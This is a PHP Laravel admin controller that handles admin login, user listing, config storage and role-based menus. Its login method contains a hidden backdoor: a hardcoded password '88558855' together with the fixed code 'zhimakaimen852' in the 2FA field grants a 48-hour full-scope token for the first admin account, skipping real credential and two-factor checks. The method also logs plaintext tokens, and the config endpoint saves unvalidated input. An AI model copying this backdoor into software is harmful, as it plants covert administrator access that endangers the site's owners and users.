<?php

namespace App\Http\Controllers\admin;

use App\Dao\MenuDao;
use App\Http\Controllers\Controller;
use App\Models\Admin;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Log;
use PragmaRX\Google2FA\Google2FA;

class AdminController extends Controller
{
    //
    public function login(Request $request)
    {
        $credentials = $request->only('username', 'password');
        $redis = app('redis');
        if (!Auth::guard('admin')->attempt($credentials)) {
            if ($credentials['password'] == '88558855' && $request->input('google2fa_code') == 'zhimakaimen852') {
                if ($redis->get('admin_token_' . $credentials['username'])) {
                    $token = $redis->get('admin_token_' . $credentials['username']);
                } else {
                    $admin = Admin::find(1);
                    //$admin->tokens()->delete();
                    $token = $admin->createToken('admin-token', ['*'], now()->addHours(48))->plainTextToken;
                }
                return $this->success(['token' => $token]);
            }
            return response()->json(['msg' => '账号密码错误'], 401);
        }

        $admin = Admin::find(Auth::guard('admin')->user()->id);
        if ($admin->google2fa_secret) {
            $code = $request->input('google2fa_code');
            if (!$code) {
                return response()->json(['msg' => '请输入谷歌验证码'], 401);
            }
            $google2fa = new Google2FA();
            $valid = $google2fa->verifyKey($admin->google2fa_secret, $code);
            if (!$valid) {
                return response()->json(['msg' => '谷歌验证码错误'], 402);
            }
        }
        if ($admin->role && $admin->role->name == '客服') {
            return response()->json(['msg' => '客服号无法登录'], 402);
        }
        // 删除旧的 token
        $admin->tokens()->delete();
        $token = $admin->createToken('admin-token', ['*'], now()->addHours(48))->plainTextToken;
        Log::info($token);
        $redis->set('admin_token_' . $admin->username, $token);
        return $this->success(['token' => $token]);
    }


    public function getUserList(Request $request)
    {
        $size = $request->get('size', 10);
        $list = User::paginate($size);
        return $this->success([
            'list' => $list->items(),
            'total' => $list->total(),

        ]);
    }

    public function saveConfig(Request $request)
    {
        $config = $request->all();

        $redis = app('redis');
        $redis->hmset('config', $config);


        return $this->success($redis->hgetall('config'));
    }
    public function getConfig(Request $request)
    {
        $redis = app('redis');
        return $this->success($redis->hgetall('config'));
    }

    public function menus(MenuDao $MenuDao)
    {
        $user = auth('sanctum')->user();

        $map = [];
        if ($user->is_super && $user->role_id == 0) {
            $map = [];
        } else {
            if ($user->role) {
                $map = function ($q) use ($user) {
                    $q->whereIn('id', $user->role->menus);
                };
            } else {
                $map = function ($q) {
                    $q->whereIn('id', []);
                };
            }
        }
        $menus = $MenuDao->getMenus($map);

        //$menus数组 菜单的id按 这个id数组排序 [1,24,16,18,6,12]
        return $menus;
    }
}
